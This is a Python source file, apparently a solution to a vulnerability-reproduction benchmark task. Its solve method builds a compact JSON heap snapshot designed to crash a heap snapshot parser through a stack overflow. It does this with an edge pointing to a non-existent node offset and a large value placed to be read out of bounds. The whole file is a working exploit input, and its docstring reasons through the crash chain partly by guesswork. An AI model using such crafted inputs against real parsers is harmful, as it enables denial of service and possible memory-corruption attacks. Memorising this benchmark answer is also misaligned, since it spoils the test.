import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a stack buffer overflow
        in a heap snapshot parser.

        The vulnerability description states a stack overflow occurs when the code
        fails to check for the existence of referenced nodes before dereferencing
        an iterator. This suggests a multi-step process:
        1. An edge in the snapshot references a non-existent node.
        2. The parser fails to find this node in its lookup map (`node_id_map`).
        3. The code enters a vulnerable path for handling this missing node.
        4. In this path, an attempt is made to read data for the non-existent node from
           an out-of-bounds memory location.
        5. The data read from this out-of-bounds location, which we can control, is
           interpreted as a size for a subsequent stack allocation.
        6. By placing a large number in a location that will be read out-of-bounds,
           we trigger an allocation of a very large buffer on the stack, leading to
           a stack overflow.

        This PoC constructs a minimal, compact JSON heap snapshot to trigger this
        chain of events:
        - It defines one node at offset 0 with `edge_count` of 1.
        - It defines one edge whose `to_node` field points to offset 6. Since the
          single node's data (6 fields) occupies offsets 0-5, offset 6 is out-of-bounds.
        - This triggers the lookup failure for the node at offset 6.
        - When the parser attempts to read the fields of this "phantom" node, it performs
          an out-of-bounds read on the internal `nodes` data array. This read may land
          in the memory region holding the `edges` data.
        - The first field of our edge is set to a large number (99999). If this value is
          read and used as a count for a stack allocation (e.g., allocating an array of
          edges), it will exhaust the stack space and cause the crash.
        """
        poc_dict = {
            "snapshot": {
                "node_count": 1,
                "edge_count": 1,
            },
            "nodes": [
                # node_fields: ["type", "name", "id", "self_size", "edge_count", "trace_node_id"]
                # A single node at offset 0, with one edge.
                0, 0, 1, 0, 1, 0
            ],
            "edges": [
                # edge_fields: ["type", "name_or_index", "to_node"]
                # An edge pointing to an invalid offset (6).
                # The 'type' field is a large number to be read OOB and used for a
                # large stack allocation.
                99999, 0, 6
            ],
            "strings": [""]
        }

        # Serialize to compact JSON format to minimize PoC size.
        return json.dumps(poc_dict, separators=(',', ':')).encode('utf-8')
